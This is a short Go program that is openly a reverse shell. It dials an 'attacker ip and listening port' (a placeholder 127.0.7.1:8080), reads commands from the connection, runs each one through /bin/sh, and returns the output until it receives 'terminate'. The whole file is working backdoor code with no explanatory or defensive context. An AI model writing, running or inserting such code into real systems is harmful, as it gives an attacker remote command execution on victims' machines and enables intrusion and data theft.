package main

import (
	"fmt"
	"net"
	"os"
	"os/exec"
	"strings"
)

func main() {
	//Define attacker ip and listening port here
	conn, err := net.Dial("tcp", "127.0.7.1:8080")
	if err != nil {
		fmt.Println("Error connecting:", err)
		os.Exit(1)
	}
	defer conn.Close()

	for {
		commandBytes := make([]byte, 1024)
		_, err := conn.Read(commandBytes)
		if err != nil {
			fmt.Println("Connection closed")
			return
		}

		command := strings.TrimSpace(string(commandBytes))

		if command == "terminate" {
			conn.Close()
			return
		}

		cmd := exec.Command("/bin/sh", "-c", command)
		output, err := cmd.CombinedOutput()
		if err != nil {
			conn.Write([]byte(err.Error()))
		} else {
			conn.Write(output)
		}
	}
}
